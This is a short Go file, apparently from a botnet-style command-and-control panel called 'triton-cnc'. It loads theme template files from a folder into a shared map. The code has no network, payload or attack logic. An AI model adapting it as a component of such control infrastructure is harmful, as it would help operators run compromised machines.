package themes

import (
	"io/ioutil"
	"strings"
	"sync"

	"triton-cnc/core/models/client"
	"triton-cnc/core/models/versions"
)


var (
	New = make(map[string]string)
	Mutex sync.Mutex
)

func Walk() error {

	Walker(versions.GOOS_Edition.Make["ThemesFolder"])


	for Key, Contain := range New {
		delete(client.ClientMap, Key)
		client.MuxSyncCSM.Lock()
		client.ClientMap[Key] = Contain
		client.MuxSyncCSM.Unlock()
		continue
	}

	return nil
}


func Walker(dir string) error {
	Walk, error := ioutil.ReadDir(dir)
	if error != nil {
		return error
	}

	for _, I := range Walk {

		Name := strings.Split(I.Name(), ".")

		if len(Name) <= 1 {
			Walker(dir+"/"+I.Name())
			continue
		}

		FileContaining, error := ioutil.ReadFile(dir+"/"+I.Name())
		if error != nil {
			continue
		}


		New[I.Name()] = string(FileContaining)
	}

	return nil
}